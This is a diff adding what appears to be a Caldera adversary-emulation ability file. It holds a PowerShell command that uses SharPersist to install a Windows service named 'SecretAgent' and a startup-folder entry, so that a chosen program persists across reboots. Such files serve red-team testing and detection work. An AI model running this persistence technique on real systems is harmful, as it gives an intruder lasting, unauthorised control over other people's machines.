@@ -1,0 +1,60 @@
+- technique_name: 'Create or Modify System Process: Windows Service'
+  executors:
+  - payloads: []
+    code: null
+    additional_info: {}
+    uploads: []
+    platform: windows
+    command: '$SharPersist = "$env:PUBLIC\Toolz\SharPersist.exe";
+
+      $service_file = "$env:PUBLIC\exf\persist_service.log";
+
+      $startup_dir_file = "$env:PUBLIC\exf\persist_startdir.log";
+
+      if ([System.IO.File]::Exists("$SharPersist")) {
+
+
+      $ServiceCmd = "$SharPersist"+" -t service -c #{location} -n SecretAgent -m add";
+
+      Invoke-Expression "$ServiceCmd"  | Out-File -FilePath "$service_file";
+
+
+      $FolderCmd = "$SharPersist"+" -t startupfolder -c #{location} -f SecretAgent
+      -m add";
+
+      Invoke-Expression "$FolderCmd" | Out-File -FilePath "$startup_dir_file";
+
+      exit 0;
+
+      }
+
+      else { "The command $SharPersist does not exists !!!" | Out-File -FilePath "$service_file";
+
+      exit 1;
+
+      };
+
+      '
+    variations: []
+    timeout: 60
+    cleanup: []
+    name: psh
+    build_target: null
+    parsers: []
+    language: null
+  repeatable: false
+  buckets: []
+  access: {}
+  additional_info:
+    cleanup: '[]'
+  description: Add a new service and a link in startup directory using sharpersist
+    after the ability has tested that the file exists
+  singleton: false
+  delete_payload: true
+  privilege: ''
+  name: Launch SharPersist
+  tactic: persistence
+  technique_id: T1547.001
+  requirements: []
+  plugin: ''
+  id: Add_service_and_startup 
